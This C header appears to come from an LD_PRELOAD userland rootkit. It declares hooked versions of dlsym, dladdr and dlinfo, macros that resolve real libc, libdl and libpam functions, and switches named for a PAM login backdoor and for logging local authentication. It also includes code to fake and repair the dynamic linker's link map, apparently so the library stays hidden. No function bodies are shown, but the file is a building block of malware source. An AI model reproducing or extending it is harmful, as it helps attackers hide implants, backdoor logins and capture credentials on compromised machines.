#ifndef LIBDL_H
#define LIBDL_H

#define LIBC_PATH    "libc.so.6"
#define LIBDL_PATH   "libdl.so.1"
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
#define LIBPAM_PATH  "libpam.so.0"
#endif

#define GLIBC_VER_STR    "GLIBC_2.%d"
#define GLIBC_VERVER_STR "GLIBC_2.%d.%d"
#define GLIBC_MAX_VER 40

#define FAKE_LINKMAP_NAME "(filo)"

extern void *_dl_sym(void *, const char *, void *);
typeof(dlsym) *o_dlsym;

void get_libc_symbol(const char *symbol, void **funcptr);
void get_libdl_symbol(const char *symbol, void **funcptr);
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
void get_libpam_symbol(const char *symbol, void **funcptr);
#endif

void locate_dlsym(void);
void *dlsym(void *handle, const char *symbol);
void get_symbol_pointer(int symbol_index, void *handle);
void _hook(void *handle, ...);
#include "gsym.c"

/* wrapper macros for resolving & using symbols */
#define hook(...) _hook(RTLD_NEXT, __VA_ARGS__)
#define call(symbol_index, ...) symbols[symbol_index].func(__VA_ARGS__)

#include "dlsym.c"

int dladdr(const void *addr, Dl_info *info);
#include "dladdr.c"

void repair_linkmap(void);
int dlinfo(void *handle, int request, void *p);
#include "dlinfo.c"

#endif